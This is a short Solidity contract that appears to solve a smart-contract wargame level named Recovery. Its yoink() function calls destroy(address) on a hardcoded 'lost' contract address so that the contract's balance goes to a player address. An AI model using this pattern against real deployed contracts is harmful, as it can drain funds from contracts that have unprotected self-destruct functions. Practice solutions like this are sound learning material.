// SPDX-License-Identifier: MIT
pragma solidity ^0.8.*;

contract Recovery {

    address target = 0xD2fA2dAda7E14BCBa5a553F80E76FF6EB2E8Cf57;
    address lost_addr = 0x5B268cDD3D2f920eed53A83E7FD9E041c8832eE3; // Found by checking the etherscan info
    address player = 0xD64D08C68F6940281c51108734B5b5DA95f62BD5;
    event TestBool(bool);
    event TestUint(uint256);

    function yoink() public {

        bytes memory payload = abi.encodeWithSignature("destroy(address)", player);
        (bool success, ) = lost_addr.call(payload);
        emit TestBool(success);
    }
}